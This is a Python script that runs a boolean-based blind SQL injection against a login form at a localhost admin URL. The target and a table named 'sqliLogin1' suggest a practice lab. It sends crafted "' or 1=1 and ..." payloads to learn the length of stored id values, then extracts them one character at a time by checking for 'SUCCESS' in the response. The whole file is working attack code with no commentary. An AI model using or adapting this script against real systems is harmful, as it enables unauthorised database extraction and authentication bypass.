import requests
URL = "http://localhost/adminlogin.php"
min = 48 # '1'
max = 122 # 'z'
num_min = 1
num_max = 255
colname = []
result = ""
data=[]
for idx in range(0, 2):
	for cnt in range(num_min , num_max+1):
		sqlquery = "' or 1=1 and length((select id from sqliLogin1 limit "+ str(idx) +",1))="+str(cnt)+"# "
		postquery = "username=" + sqlquery + "&password=1&form=submit"
		res = requests.post(url=URL, data=postquery, headers={'Content-Type': 'application/x-www-form-urlencoded'})
		if "SUCCESS" in res.text:
			print(f"Catch one! {cnt}")
			colname.append(cnt)
			break
print(f"col name_length is {colname}")
for index in range(len(colname)):
	result = ""
	for j in range(1, colname[index]+1):
		for cnt in range(min, max+1):
			sqlquery = "' or 1=1 and ascii(substring((select id from sqliLogin1 limit "+ str(index) +", 1),"+ str(j) +",1)) ="+ str(cnt) + "# "
			postquery = "username=" + sqlquery + "&password=1&form=submit"
			res = requests.post(url=URL, data=postquery, headers={'Content-Type': 'application/x-www-form-urlencoded'})
			if "SUCCESS" in res.text:
				result = result + chr(cnt)
				break
	data.append(result)
print(f"data : {data}")